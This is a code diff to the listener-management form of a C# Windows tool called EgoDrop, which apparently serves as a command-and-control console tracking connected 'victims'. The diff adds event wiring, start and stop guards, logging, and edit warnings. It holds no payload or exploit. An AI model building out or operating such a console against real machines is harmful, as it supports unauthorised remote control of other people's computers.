@@ -12,13 +12,15 @@ namespace EgoDrop
 {
     public partial class frmListener : Form
     {
+        private frmMain m_fMain { get; set; }
         public clsSqlite m_sqlite { get; set; }
         public Dictionary<string, clsListener> m_dicListener { get; set; }
 
-        public frmListener(clsSqlite sqlite, Dictionary<string, clsListener> dicListener)
+        public frmListener(frmMain fMain, clsSqlite sqlite, Dictionary<string, clsListener> dicListener)
         {
             InitializeComponent();
 
+            m_fMain = fMain;
             m_sqlite = sqlite;
             m_dicListener = dicListener;
         }
@@ -78,7 +80,20 @@ namespace EgoDrop
             foreach (ListViewItem item in listView1.Items)
             {
                 clsListener listener = fnGetListenerFromTag(item);
+                if (listener.m_bIsListening)
+                    continue;
+
                 listener.fnStart();
+
+                listener.evtNewVictim -= m_fMain.fnOnNewVictim;
+                listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
+                listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
+
+                listener.evtNewVictim += m_fMain.fnOnNewVictim;
+                listener.evtReceivedMessage += m_fMain.fnReceivedMessage;
+                listener.evtVictimDisconnected += m_fMain.fnOnVictimDisconnected;
+
+                m_fMain.fnSysLog($"Started listener(Name={listener.m_stListener.szName}, Port={listener.m_stListener.nPort}, Protocol={Enum.GetName(listener.m_stListener.protoListener)})");
             }
 
             fnLoadListener();
@@ -89,7 +104,16 @@ namespace EgoDrop
             foreach (ListViewItem item in listView1.Items)
             {
                 clsListener listener = fnGetListenerFromTag(item);
+                if (!listener.m_bIsListening)
+                    continue;
+
                 listener.fnStop();
+
+                listener.evtNewVictim -= m_fMain.fnOnNewVictim;
+                listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
+                listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
+
+                m_fMain.fnSysLog($"Stoppped listener: " + listener.m_stListener.szName);
             }
 
             fnLoadListener();
@@ -147,6 +171,12 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                if (fnGetListenerFromTag(item).m_bIsListening)
+                {
+                    MessageBox.Show("Please stop the listener before you edit it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    continue;
+                }
+
                 frmListenerEdit f = new frmListenerEdit(this, fnGetListenerFromTag(item).m_stListener);
 
                 f.ShowDialog();
@@ -206,6 +236,12 @@ namespace EgoDrop
             List<ListViewItem> ls = listView1.SelectedItems.Cast<ListViewItem>().ToList();
             if (ls.Count == 0)
                 return;
+
+            if (fnGetListenerFromTag(ls.First()).m_bIsListening)
+            {
+                MessageBox.Show("Please stop the listener before you edit it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
 
             frmListenerEdit f = new frmListenerEdit(this, fnGetListenerFromTag(ls.First()).m_stListener);
 
